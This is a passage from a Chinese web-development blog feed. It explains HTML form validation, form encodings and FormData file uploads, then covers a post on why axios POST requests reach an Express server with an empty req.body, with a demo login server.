class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>上面的表单输入框，要求只能输入小写字母，且不得超过15个字符。如果输入不符合要求（比如输入“ABC”），提交表单的时候，Chrome 浏览器会弹出报错信息“Please match the requested format.”，禁止表单提交。下面使用<code>setCustomValidity()</code>方法替换掉报错信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var input = document.getElementById(&#x27;username&#x27;);</span><br><span class="line">input.oninvalid = function (event) &#123;</span><br><span class="line">  event.target.setCustomValidity(</span><br><span class="line">    &#x27;用户名必须是小写字母，不能为空，最长不超过15个字符&#x27;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，<code>setCustomValidity()</code>方法是在<code>invalid</code>事件的监听函数里面调用。该方法也可以直接调用，这时如果参数不为空字符串，浏览器就会认为该控件没有通过校验，就会立刻显示该方法设置的报错信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/* HTML 代码如下</span><br><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;p&gt;&lt;input type=&quot;file&quot; id=&quot;fs&quot;&gt;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">document.getElementById(&#x27;fs&#x27;).onchange = checkFileSize;</span><br><span class="line"></span><br><span class="line">function checkFileSize() &#123;</span><br><span class="line">  var fs = document.getElementById(&#x27;fs&#x27;);</span><br><span class="line">  var files = fs.files;</span><br><span class="line">  if (files.length &gt; 0) &#123;</span><br><span class="line">     if (files[0].size &gt; 75 * 1024) &#123;</span><br><span class="line">       fs.setCustomValidity(&#x27;文件不能大于 75KB&#x27;);</span><br><span class="line">       return;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fs.setCustomValidity(&#x27;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码一旦发现文件大于 75KB，就会设置校验失败，同时给出自定义的报错信息。然后，点击提交按钮时，就会显示报错信息。这种校验失败是不会自动消除的，所以如果所有文件都符合条件，要将报错信息设为空字符串，手动消除校验失败的状态。</p><h3 id="validity-属性"><a href="#validity-属性" class="headerlink" title="validity 属性"></a>validity 属性</h3><p>控件元素的属性<code>validity</code>属性返回一个<code>ValidityState</code>对象，包含当前校验状态的信息。</p><p>该对象有以下属性，全部为只读属性。</p><ul><li><code>ValidityState.badInput</code>：布尔值，表示浏览器是否不能将用户的输入转换成正确的类型，比如用户在数值框里面输入字符串。</li><li><code>ValidityState.customError</code>：布尔值，表示是否已经调用<code>setCustomValidity()</code>方法，将校验信息设置为一个非空字符串。</li><li><code>ValidityState.patternMismatch</code>：布尔值，表示用户输入的值是否不满足模式的要求。</li><li><code>ValidityState.rangeOverflow</code>：布尔值，表示用户输入的值是否大于最大范围。</li><li><code>ValidityState.rangeUnderflow</code>：布尔值，表示用户输入的值是否小于最小范围。</li><li><code>ValidityState.stepMismatch</code>：布尔值，表示用户输入的值不符合步长的设置（即不能被步长值整除）。</li><li><code>ValidityState.tooLong</code>：布尔值，表示用户输入的字数超出了最长字数。</li><li><code>ValidityState.tooShort</code>：布尔值，表示用户输入的字符少于最短字数。</li><li><code>ValidityState.typeMismatch</code>：布尔值，表示用户填入的值不符合类型要求（主要是类型为 Email 或 URL 的情况）。</li><li><code>ValidityState.valid</code>：布尔值，表示用户是否满足所有校验条件。</li><li><code>ValidityState.valueMissing</code>：布尔值，表示用户没有填入必填的值。</li></ul><p>下面是一个例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var input = document.getElementById(&#x27;myinput&#x27;);</span><br><span class="line">if (input.validity.valid) &#123;</span><br><span class="line">  console.log(&#x27;通过校验&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  console.log(&#x27;校验失败&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是另外一个例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var txt = &#x27;&#x27;;</span><br><span class="line">if (document.getElementById(&#x27;myInput&#x27;).validity.rangeOverflow) &#123;</span><br><span class="line">  txt = &#x27;数值超过上限&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&#x27;prompt&#x27;).innerHTML = txt;</span><br></pre></td></tr></table></figure><p>如果想禁止浏览器弹出表单验证的报错信息，可以监听<code>invalid</code>事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var input = document.getElementById(&#x27;username&#x27;);</span><br><span class="line">var form  = document.getElementById(&#x27;form&#x27;);</span><br><span class="line"></span><br><span class="line">var elem = document.createElement(&#x27;div&#x27;);</span><br><span class="line">elem.id  = &#x27;notify&#x27;;</span><br><span class="line">elem.style.display = &#x27;none&#x27;;</span><br><span class="line">form.appendChild(elem);</span><br><span class="line"></span><br><span class="line">input.addEventListener(&#x27;invalid&#x27;, function (event) &#123;</span><br><span class="line">  event.preventDefault();</span><br><span class="line">  if (!event.target.validity.valid) &#123;</span><br><span class="line">    elem.textContent   = &#x27;用户名必须是小写字母&#x27;;</span><br><span class="line">    elem.className     = &#x27;error&#x27;;</span><br><span class="line">    elem.style.display = &#x27;block&#x27;;</span><br><span class="line">    input.className    = &#x27;invalid animated shake&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">input.addEventListener(&#x27;input&#x27;, function(event)&#123;</span><br><span class="line">  if ( &#x27;block&#x27; === elem.style.display ) &#123;</span><br><span class="line">    input.className = &#x27;&#x27;;</span><br><span class="line">    elem.style.display = &#x27;none&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，一旦发生<code>invalid</code>事件（表单验证失败），<code>event.preventDefault()</code>用来禁止浏览器弹出默认的验证失败提示，然后设置定制的报错提示框。</p><h3 id="表单的-novalidate-属性"><a href="#表单的-novalidate-属性" class="headerlink" title="表单的 novalidate 属性"></a>表单的 novalidate 属性</h3><p>表单元素的 HTML 属性<code>novalidate</code>，可以关闭浏览器的自动校验。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form novalidate&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>这个属性也可以在脚本里设置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">form.noValidate = true;</span><br></pre></td></tr></table></figure><p>如果表单元素没有设置<code>novalidate</code>属性，那么提交按钮（<code>&lt;button&gt;</code>或<code>&lt;input&gt;</code>元素）的<code>formnovalidate</code>属性也有同样的作用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;submit&quot; formnovalidate&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h2 id="enctype-属性"><a href="#enctype-属性" class="headerlink" title="enctype 属性"></a>enctype 属性</h2><p>表单能够用四种编码，向服务器发送数据。编码格式由表单的<code>enctype</code>属性决定。</p><p>假定表单有两个字段，分别是<code>foo</code>和<code>baz</code>，其中<code>foo</code>字段的值等于<code>bar</code>，<code>baz</code>字段的值是一个分为两行的字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The first line.</span><br><span class="line">The second line.</span><br></pre></td></tr></table></figure><p>下面四种格式，都可以将这个表单发送到服务器。</p><p><strong>（1）GET 方法</strong></p><p>如果表单使用<code>GET</code>方法发送数据，<code>enctype</code>属性无效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action=&quot;register.php&quot;</span><br><span class="line">  method=&quot;get&quot;</span><br><span class="line">  onsubmit=&quot;AJAXSubmit(this); return false;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>数据将以 URL 的查询字符串发出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?foo=bar&amp;baz=The%20first%20line.%0AThe%20second%20line.</span><br></pre></td></tr></table></figure><p><strong>（2）application/x-www-form-urlencoded</strong></p><p>如果表单用<code>POST</code>方法发送数据，并省略<code>enctype</code>属性，那么数据以<code>application/x-www-form-urlencoded</code>格式发送（因为这是默认值）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action=&quot;register.php&quot;</span><br><span class="line">  method=&quot;post&quot;</span><br><span class="line">  onsubmit=&quot;AJAXSubmit(this); return false;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>发送的 HTTP 请求如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">foo=bar&amp;baz=The+first+line.%0D%0AThe+second+line.%0D%0A</span><br></pre></td></tr></table></figure><p>上面代码中，数据体里面的<code>%0D%0A</code>代表换行符（<code>\r\n</code>）。</p><p><strong>（3）text/plain</strong></p><p>如果表单使用<code>POST</code>方法发送数据，<code>enctype</code>属性为<code>text/plain</code>，那么数据将以纯文本格式发送。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action=&quot;register.php&quot;</span><br><span class="line">  method=&quot;post&quot;</span><br><span class="line">  enctype=&quot;text/plain&quot;</span><br><span class="line">  onsubmit=&quot;AJAXSubmit(this); return false;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>发送的 HTTP 请求如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">foo=bar</span><br><span class="line">baz=The first line.</span><br><span class="line">The second line.</span><br></pre></td></tr></table></figure><p><strong>（4）multipart/form-data</strong></p><p>如果表单使用<code>POST</code>方法，<code>enctype</code>属性为<code>multipart/form-data</code>，那么数据将以混合的格式发送。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form</span><br><span class="line">  action=&quot;register.php&quot;</span><br><span class="line">  method=&quot;post&quot;</span><br><span class="line">  enctype=&quot;multipart/form-data&quot;</span><br><span class="line">  onsubmit=&quot;AJAXSubmit(this); return false;&quot;</span><br><span class="line">&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>发送的 HTTP 请求如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=---------------------------314911788813839</span><br><span class="line"></span><br><span class="line">-----------------------------314911788813839</span><br><span class="line">Content-Disposition: form-data; name=&quot;foo&quot;</span><br><span class="line"></span><br><span class="line">bar</span><br><span class="line">-----------------------------314911788813839</span><br><span class="line">Content-Disposition: form-data; name=&quot;baz&quot;</span><br><span class="line"></span><br><span class="line">The first line.</span><br><span class="line">The second line.</span><br><span class="line"></span><br><span class="line">-----------------------------314911788813839--</span><br></pre></td></tr></table></figure><p>这种格式也是文件上传的格式。</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>用户上传文件，也是通过表单。具体来说，就是通过文件输入框选择本地文件，提交表单的时候，浏览器就会把这个文件发送到服务器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;myFile&quot;&gt;</span><br></pre></td></tr></table></figure><p>此外，还需要将表单<code>&lt;form&gt;</code>元素的<code>method</code>属性设为<code>POST</code>，<code>enctype</code>属性设为<code>multipart/form-data</code>。其中，<code>enctype</code>属性决定了 HTTP 头信息的<code>Content-Type</code>字段的值，默认情况下这个字段的值是<code>application/x-www-form-urlencoded</code>，但是文件上传的时候要改成<code>multipart/form-data</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for=&quot;file&quot;&gt;选择一个文件&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;myFile&quot; multiple&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; id=&quot;submit&quot; name=&quot;submit_button&quot; value=&quot;上传&quot; /&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>上面的 HTML 代码中，file 控件的<code>multiple</code>属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var fileSelect = document.getElementById(&#x27;file&#x27;);</span><br><span class="line">var files = fileSelect.files;</span><br></pre></td></tr></table></figure><p>然后，新建一个 FormData 实例对象，模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var formData = new FormData();</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; files.length; i++) &#123;</span><br><span class="line">  var file = files[i];</span><br><span class="line"></span><br><span class="line">  // 只上传图片文件</span><br><span class="line">  if (!file.type.match(&#x27;image.*&#x27;)) &#123;</span><br><span class="line">    continue;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  formData.append(&#x27;photos[]&#x27;, file, file.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，使用 Ajax 向服务器上传文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.open(&#x27;POST&#x27;, &#x27;handler.php&#x27;, true);</span><br><span class="line"></span><br><span class="line">xhr.onload = function () &#123;</span><br><span class="line">  if (xhr.status !== 200) &#123;</span><br><span class="line">    console.log(&#x27;An error occurred!&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send(formData);</span><br></pre></td></tr></table></figure><p>除了发送 FormData 实例，也可以直接 AJAX 发送文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var file = document.getElementById(&#x27;test-input&#x27;).files[0];</span><br><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">xhr.open(&#x27;POST&#x27;, &#x27;myserver/uploads&#x27;);</span><br><span class="line">xhr.setRequestHeader(&#x27;Content-Type&#x27;, file.type);</span><br><span class="line">xhr.send(file);</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://webdesign.tutsplus.com/tutorials/html5-form-validation-with-the-pattern-attribute--cms-25145">HTML5 Form Validation With the “pattern” Attribute</a>, Thoriq Firdaus</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;表单，FormData-对象&quot;&gt;&lt;a href=&quot;#表单，FormData-对象&quot; class=&quot;headerlink&quot; title=&quot;表单，FormData 对象&quot;&gt;&lt;/a&gt;表单，FormData 对象&lt;/h1&gt;&lt;h5 id=&quot;目录-隐藏&quot;&gt;&lt;a href=&quot;#</summary>
      
    
    
    
    <category term="Node" scheme="https://coloey.github.io/categories/Node/"/>
    
    <category term="HTML5" scheme="https://coloey.github.io/categories/Node/HTML5/"/>
    
    
  </entry>
  
  <entry>
    <title>axios发送请求时后台接收的req.body为空</title>
    <link href="https://coloey.github.io/2022/03/21/axios%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E6%97%B6%E5%90%8E%E5%8F%B0%E6%8E%A5%E6%94%B6%E7%9A%84req-body%E4%B8%BA%E7%A9%BA/"/>
    <id>https://coloey.github.io/2022/03/21/axios%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E6%97%B6%E5%90%8E%E5%8F%B0%E6%8E%A5%E6%94%B6%E7%9A%84req-body%E4%B8%BA%E7%A9%BA/</id>
    <published>2022-03-21T01:47:50.000Z</published>
    <updated>2022-03-21T03:12:20.438Z</updated>
    
    <content type="html"><![CDATA[<p>首先，先了解一下关于http协议里定义的四种常见数据的post方法，分别是：<br>application/www-form-ulrencoded<br>multipart/form-data<br>application/json<br>text/xml</p><p>Express依赖bodyParser对请求的包体进行解析。默认支持application/json,application/www-form-urlencoded,multipart/form-data.单数对xml没有支持。需要自己代码来实现</p><p>用axios post请求提交数据的时候需要清楚发送请求的类型是哪种，后台用相应的方法解析</p><p>1 使用FormData提交表单数据</p><p>坑一：使用FormData时一定要在先绑定submit事件，在submit事件触发时发送axios post请求,否则获取不到formData里面的值</p><p>坑二:axios请求里面如果直接使用data:formData，浏览器会自动帮我们加上 <code>Content-Type: multipart/form-data</code> ，因此请求要这样设置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">&quot;myForm&quot;</span>);</span><br><span class="line">       <span class="comment">// 用表单来初始化</span></span><br><span class="line">       <span class="keyword">var</span> formData = <span class="keyword">new</span> FormData(form);</span><br><span class="line">       <span class="comment">// 我们可以根据name来访问表单中的字段</span></span><br><span class="line">       <span class="keyword">var</span> username = formData.get(<span class="string">&quot;username&quot;</span>); <span class="comment">// 获取名字</span></span><br><span class="line">       <span class="keyword">var</span> password = formData.get(<span class="string">&quot;password&quot;</span>); <span class="comment">// 获取密码</span></span><br><span class="line">       axios(&#123;</span><br><span class="line">           <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">           <span class="attr">url</span>:<span class="string">&#x27;http://127.0.0.1/api/login&#x27;</span>,</span><br><span class="line">           <span class="attr">data</span>:&#123;</span><br><span class="line">               <span class="attr">username</span>:username,</span><br><span class="line">               <span class="attr">password</span>:password</span><br><span class="line">           &#125;</span><br><span class="line">            </span><br><span class="line">       &#125;)</span><br></pre></td></tr></table></figure><p>这样默认Content-type：application/json,</p><p>如果表单属性过多，可以先用一个对象接收：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">&quot;myForm&quot;</span>);</span><br><span class="line">        <span class="comment">// 用表单来初始化</span></span><br><span class="line">        <span class="keyword">var</span> formData = <span class="keyword">new</span> FormData(form);</span><br><span class="line">        <span class="comment">// 我们可以根据name来访问表单中的字段</span></span><br><span class="line">        <span class="keyword">let</span> myFormData=&#123;&#125;;</span><br><span class="line">        <span class="comment">//如果表单属性过多可以先遍历</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> pair <span class="keyword">of</span> formData.entries())&#123;</span><br><span class="line">            myFormData[pair[<span class="number">0</span>]]=pair[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        axios(&#123;</span><br><span class="line">            <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">            <span class="attr">url</span>:<span class="string">&#x27;http://127.0.0.1/api/login&#x27;</span>,</span><br><span class="line">            <span class="attr">data</span>:myFormData</span><br><span class="line">             </span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>后台接收使用中间件body-parser解析表单体数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express=<span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session=<span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cors=<span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser=<span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app=express();</span><br><span class="line">app.use(cors());</span><br><span class="line">app.use(</span><br><span class="line">    session(&#123;</span><br><span class="line">        <span class="attr">secret</span>:<span class="string">&#x27;xiaoqi&#x27;</span>,</span><br><span class="line">        <span class="attr">resave</span>:<span class="literal">false</span>,</span><br><span class="line">        <span class="attr">saveUninitialized</span>:<span class="literal">true</span></span><br><span class="line">    &#125;)</span><br><span class="line">)</span><br><span class="line"><span class="comment">//托管静态页面</span></span><br><span class="line">app.use(express.static(<span class="string">&#x27;./pages&#x27;</span>));</span><br><span class="line"><span class="comment">//自定义解析Post提交过来的表单数据</span></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>:<span class="literal">false</span>&#125;))</span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line"><span class="comment">//登录API接口</span></span><br><span class="line">app.post(<span class="string">&#x27;/api/login&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//判断用户提交的登录信息是否正确</span></span><br><span class="line">    <span class="comment">//console.log(req.body)</span></span><br><span class="line">    <span class="keyword">if</span>(req.body.username!==<span class="string">&quot;admin&quot;</span>||req.body.password!==<span class="string">&quot;888888&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">status</span>:<span class="number">1</span>,<span class="attr">msg</span>:<span class="string">&#x27;登录失败&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//登录成功则把信息存储在Session中</span></span><br><span class="line">    <span class="built_in">console</span>.log(req.body);</span><br><span class="line">    req.session.user=req.body;<span class="comment">//用户登录信息</span></span><br><span class="line">    req.session.islogin=<span class="literal">true</span>;<span class="comment">//用户登录状态</span></span><br><span class="line">    res.send(&#123;<span class="attr">status</span>:<span class="number">0</span>,<span class="attr">msg</span>:<span class="string">&#x27;登录成功&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//获取用户姓名的接口</span></span><br><span class="line">app.get(<span class="string">&#x27;/api/username&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//从Session中获取用户姓名响应给客户端</span></span><br><span class="line">    <span class="keyword">if</span>(!req.session.islogin)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(&#123;<span class="attr">status</span>:<span class="number">1</span>,<span class="attr">msg</span>:<span class="string">&#x27;fail&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    res.send(&#123;</span><br><span class="line">        <span class="attr">status</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="attr">msg</span>:<span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">        <span class="attr">username</span>:req.session.user.username,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//退出登录的接口</span></span><br><span class="line">app.post(<span class="string">&#x27;/api/logout&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//清空当前客户端的session信息</span></span><br><span class="line">    req.session.destroy()</span><br><span class="line">    res.send(&#123;</span><br><span class="line">        <span class="attr">status</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="attr">msg</span>:<span class="string">&#x27;退出登录成功&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">app.listen(<span class="number">80</span>,<span 